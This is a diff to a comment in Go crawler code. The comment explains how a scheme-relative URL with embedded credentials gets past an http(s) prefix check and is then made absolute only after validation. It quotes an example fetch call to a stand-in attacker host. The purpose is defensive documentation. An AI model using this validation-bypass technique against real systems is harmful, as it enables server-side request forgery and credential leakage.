@@ -71,8 +71,9 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		// keyed off an http(s):// prefix test, which a scheme-relative literal walks
 		// straight past: `fetch("//u:p@attacker.example/api/collect")` has no scheme,
 		// so the gate skipped it, and then resolveURL's base.ResolveReference COPIES
-		// ref.User and inherits the base scheme — reconstituting
-		// `https://u:p@attacker.example/api/collect` after the check had already run.
+		// ref.User and inherits the base scheme — reconstituting the identical
+		// embedded userinfo as an absolute URL (scheme now present, host and
+		// credentials unchanged) after the check had already run.
 		// That candidate is floored to the default --confidence by classify Rule 7
 		// (it is an IsJSStaticSource with an API-indicator path), reaches
 		// OptionsProbe.probeURL where ssrf.ValidateURL inspects only scheme and
